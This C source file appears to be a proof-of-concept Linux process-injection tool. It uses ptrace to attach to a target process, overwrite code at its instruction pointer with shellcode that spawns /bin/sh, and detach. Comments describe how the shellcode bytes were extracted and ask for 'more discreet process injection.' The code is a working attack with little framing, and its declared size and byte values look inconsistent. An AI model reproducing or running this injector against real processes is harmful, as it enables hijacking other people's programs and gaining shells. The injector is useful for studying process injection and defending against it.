#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#include <sys/user.h>
#include <sys/reg.h>

#define SHELLCODE_SIZE 26

// - 32 byte shellcode, sourced from others
// unsigned char *shellcode = 
//   "\x48\x31\xc0\x48\x89\xc2\x48\x89"
//   "\xc6\x48\x8d\x3d\x04\x00\x00\x00"
//   "\x04\x3b\x0f\x05\x2f\x62\x69\x6e"
//   "\x2f\x73\x68\x00\xcc\x90\x90\x90";

// - The following bash-fu line to extract a C string from objdump
//   has a bug: one \x00 is missing
// $ objdump -d ./shellcode.o | grep '[0-9a-f]:' | grep -v 'file' \
//                            | cut -f2 -d: | cut -f1-6 -d' ' \
//                            | tr -s ' ' | tr '\t' ' ' | sed 's/ $//g' \
//                            | sed 's/ /\\x/g' | paste -d '' -s \
//                            | sed 's/^/"/' | sed 's/$/"/g'
// - output:
//   "\x48\x31\xc0\x48\x89\xc2\x48\x89\xc6\x48\x8d\x3d\x04\x00\x00"
//   "\x04\x3b\x0f\x05\x2f\x62\x69\x6e\x2f\x73\x68"

// Custom shellcode
unsigned char *shellcode = 
  "\x48\x31\xc0\x48\x89\xc2\x48\x89\xc6\x48\x8d\x3d\x04\x00\x00"
  "\x00\x04\x3b\x0f\x05\x2f\x62\x69\x6e\x2f\x73\x68";
// ^ this byte (\x00) is missing.

/**
 * This script injects code into program P at program P's
 * current instruction pointer, which will irrecoverably
 * corrupt P's memory. Further refinements to this program
 * are needed for more discreet process injection.
 */

int inject_data(pid_t pid, unsigned char *src, void *dst, int len) {
  int i;
  // POKETEXT works on words, so convert to word pointers (32 bits)
  uint32_t *s = (uint32_t*) src;
  uint32_t *d = (uint32_t*) dst;

  for (i = 0; i < len; i += 4, s++, d++) {
    if ((ptrace(PTRACE_POKETEXT, pid, d, *s)) < 0) {
      perror("ptrace(POKETEXT):");
      return -1;
    }
  }

  return 0;
}

int main(int argc, char *argv[]) {
  pid_t target;
  struct user_regs_struct regs;
  int syscall;
  long dst;

  if (argc != 2) {
    fprintf(stderr, "Usage: %s pid\n", argv[0]);
    exit(1);
  }

  target = atoi(argv[1]);
  printf("+ Tracing process %d\n", target);
  if ((ptrace(PTRACE_ATTACH, target, NULL, NULL)) < 0) {
    perror("ptrace(ATTACH):");
    exit(1);
  }

  printf("+ Waiting for process...\n");
  wait(NULL);

  // Get the registers and smash the memory
  printf("+ Getting registers\n");

  if ((ptrace(PTRACE_GETREGS, target, NULL, &regs)) < 0) {
    perror("ptrace(GETREGS):");
    exit(1);
  }

  printf("+ Injecting shellcode at %p\n", (void*) regs.rip);
  inject_data(target, shellcode, (void*) regs.rip, SHELLCODE_SIZE);
  // Shifting the RIP register wasn't necessary with the 26 byte shellcode.
  // regs.rip += 2;

  printf("+ Setting instruction pointer to %p\n", (void*) regs.rip);
  if ((ptrace(PTRACE_SETREGS, target, NULL, &regs)) < 0) {
    perror("ptrace(GETREGS):");
    exit(1);
  }
  printf("+ Run it!\n");

  if ((ptrace(PTRACE_DETACH, target, NULL, NULL)) < 0) {
    perror("ptrace(DETACH):");
    exit(1);
  }

  return 0;
}